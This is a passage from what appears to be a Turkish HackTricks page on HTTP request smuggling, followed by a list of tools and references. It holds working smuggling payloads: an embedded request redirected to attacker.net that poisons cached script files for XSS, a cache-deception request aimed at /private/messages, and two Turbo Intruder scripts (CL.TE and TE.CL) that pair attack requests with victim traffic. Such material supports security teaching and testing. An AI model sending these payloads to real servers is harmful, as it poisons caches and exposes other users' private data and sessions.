Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Not edin `/post/next?postId=3` hedef alan gömülü bir isteği. Bu istek, alan adını belirlemek için **Host başlık değerini** kullanarak `/post?postId=4`'e yönlendirilecektir. **Host başlığını** değiştirerek, saldırgan isteği kendi alan adına yönlendirebilir (**yerinde yönlendirme ile açık yönlendirme**).

Başarılı bir **soket zehirlenmesi**nden sonra, `/static/include.js` için bir **GET isteği** başlatılmalıdır. Bu istek, önceki **yerinde yönlendirme ile açık yönlendirme** isteği tarafından kirletilecek ve saldırgan tarafından kontrol edilen betiğin içeriğini alacaktır.

Ardından, `/static/include.js` için yapılan herhangi bir istek, saldırganın betiğinin önbelleğe alınmış içeriğini sunacak ve etkili bir XSS saldırısı başlatacaktır.


### Web önbellek aldatma için HTTP isteği kaçırma kullanma <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web önbellek zehirlenmesi ile web önbellek aldatma arasındaki fark nedir?**
>
> * **Web önbellek zehirlenmesi**nde, saldırgan uygulamanın önbelleğine bazı kötü amaçlı içeriklerin depolanmasına neden olur ve bu içerik önbellekten diğer uygulama kullanıcılarına sunulur.
> * **Web önbellek aldatma**da, saldırgan uygulamanın önbelleğine başka bir kullanıcıya ait bazı hassas içeriklerin depolanmasına neden olur ve saldırgan daha sonra bu içeriği önbellekten alır.

Saldırgan, hassas kullanıcıya özgü içeriği almak için kaçırılmış bir istek oluşturur. Aşağıdaki örneği düşünün:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Eğer bu kaçak istek, statik içerik için önbelleğe alınmış bir öğeyi zehirlerse (örneğin, `/someimage.png`), kurbanın `/private/messages` dizinindeki hassas verileri, statik içeriğin önbellek girişi altında önbelleğe alınabilir. Sonuç olarak, saldırgan bu önbelleğe alınmış hassas verilere erişebilir.

### HTTP Yanıtı Ayrıştırma ile HTTP İstek Kaçakçılığını Silahlandırma

HTTP İstek Kaçakçılığı zafiyeti buldunuz ve nasıl istismar edeceğinizi bilmiyor musunuz? İşte başka bir istismar yöntemi deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder betikleri

### CL.TE

Kaynak: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Kaynak: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Araçlar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araç, tuhaf istek smuggling farklılıklarını bulmak için kullanışlı bir dilbilgisi tabanlı HTTP Fuzzer'dır.

## Referanslar

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
